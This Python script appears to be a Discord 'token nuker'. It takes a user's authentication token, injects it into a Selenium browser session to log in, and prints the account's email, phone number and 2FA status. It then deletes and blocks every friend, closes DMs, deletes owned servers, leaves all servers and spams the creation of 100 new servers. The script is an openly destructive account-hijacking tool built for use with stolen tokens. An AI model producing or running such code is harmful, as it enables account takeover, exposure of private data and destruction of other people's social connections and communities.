import requests
import os
import json
from requests.api import head
from selenium import webdriver
import discord
import sys
import inspect
currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir) 
from panel import logo
import asyncio
import platform
if platform.system() == 'Windows':
	asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

codetolang = {
    "en-US":"English (United States)",
    "en-GB":"English (Great Britain)",
    "zh-CN":"Chinese (China)",
    "zh-TW":"Chinese (Taiwan)",
    "cs":"Czech",
    "da":"Danish",
    "nl":"Dutch",
    "fr":"French",
    "de":"German",
    "el":"Greek",
    "hu":"Hungarian",
    "it":"Italian",
    "ja":"Japanese",
    "ko":"Korean",
    "no":"Norwegian",
    "pl":"Polish",
    "pt-BR":"Portuguese (Brazil)",
    "ru":"Russian",
    "es-ES":"Spanish (Spain)",
    "sv-SE":"Swedish",
	"th":"Thailand",
    "tr":"Turkish",
    "bg":"Bulgarian",
    "uk":"Ukrainian",
    "fi":"Finnish",
    "hr":"Croatian",
    "ro":"Romanian",
    "lt":"Lithuanian"
}

def clear():
	lambda: os.system('cls')


def token_login(token):
	opt = webdriver.ChromeOptions()
	opt.add_experimental_option("detach", True)
	driver = webdriver.Chrome(r"C:\\webdrivers\\chromedriver.exe", options = opt)
	driver.get("https://discord.com/login")
	login_script = """
									function login(token) {
									setInterval(() => {
										document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
									}, 50);
									setTimeout(() => {
										location.reload();
									}, 2500);
								}
									"""
	driver.execute_script(login_script + f'\nlogin("{token}")')

	input()


def token_info(token):
		r = requests.get('https://discord.com/api/v9/users/@me', headers={"Authorization": token})
		infos = r.json()
		lang = infos['locale']
		print(f"""Username: {infos['username']}
Discriminator: {infos['discriminator']}
User ID: {infos['id']}
Bio: {infos['bio']}
Language: {codetolang[lang]}
E-mail: {infos['email']}
Verified: {infos['verified']}
Phone number: {infos['phone']}
2FA Enabled: {infos['mfa_enabled']}""")

def del_block_friends(token, block='n'):
	r2 = requests.get("https://discord.com/api/v8/users/@me/relationships", headers={"authorization": token})
	if r2.status_code == 200:
		count = 0
		if block == 'n':
			sys.stdout.write('Deleting friends...')
		else:
			sys.stdout.write('Deleting and blocking friends')
		sys.stdout.flush()
		for i in r2.json():
			count += 1

			sys.stdout.write(f'\rDeleted: {count} | Remaining: {len(r2.json()) - count}')
			sys.stdout.flush()
			requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{i['id']}", headers={"authorization": token})
			if block == 'y':
				requests.put(f"https://discord.com/api/v9/users/@me/relationships/{i['id']}", headers={"authorization": token}, json={"type": 2})			
			
	else:
		print(f'There is a problem with the token... "{r2.json()["message"]}"')
			
def close_dms(token):
	r3 = requests.get("https://discord.com/api/v9/users/@me/channels", headers={"authorization": token})
	if r3.status_code == 200:
		count = 0
		sys.stdout.write('Closing DMs...')
		sys.stdout.flush()
		for i in r3.sjon():
			count += 1
			requests.delete(f"https://discord.com/api/v9/channels/{i['id']}", headers={"authorization": token})
		print(f'Closed {count} DMs')
	else:
		print(f'There is a problem with the token... "{r3.json()["message"]}"')

def delete_servers(token):
	r4 = requests.get("https://discord.com/api/v9/users/@me/guilds", headers={"authorization": token})
	if r4.status_code == 200:
		count = 0
		deleted = 0
		sys.stdout.write('Deleting servers...')
		sys.stdout.flush()
		for i in r4.json():
			count += 1
			if i["owner"] is False:
				pass
			else:
				deleted += 1
				requests.post(f"https://discord.com/api/v9/guilds/{i['id']}/delete", headers={"authorization": token})
				sys.stdout.write(f'\rDeleted: {deleted} | Not owner: {count - deleted} | Remaining: {len(r4.json()) - count}')
				sys.stdout.flush()
	else:
		print(f'There is a problem with the token... "{r4.json()["message"]}"')

def leave_servers(token):
	r5 = requests.get("https://discord.com/api/v9/users/@me/guilds", headers={"authorization": token})
	if r5.status_code == 200:
		count = 0
		sys.stdout.write('Leaving servers...')
		sys.stdout.flush()
		for i in r5.json():
			count += 1
			requests.delete(
            f"https://discord.com/api/v9/users/@me/guilds/{i['id']}", headers={"authorization": token})
			sys.stdout.write(f'\rServers left: {count} | Remaining: {len(r5.json()) - count}')
			sys.stdout.flush()
	else:
		print(f'There is a problem with the token... "{r5.json()["message"]}"')


def mass_create(token, name):
	r6 = requests.get("https://discord.com/api/v9/guilds", headers={"authorization": token})
	count = 0
	sys.stdout.write('Creating servers...')
	sys.stdout.flush()
	while count < 100:
		count += 1
		server_name = name + '# ' + str(count)
		requests.post("https://discord.com/api/v9/guilds", headers={"authorization": token}, json={"name": server_name})




TOKEN = ''
#token_login(TOKEN)
#del_block_friends(TOKEN)
#token_info(TOKEN)
#leave_servers(TOKEN)
delete_servers(TOKEN)
#mass_create(TOKEN, 'ooo')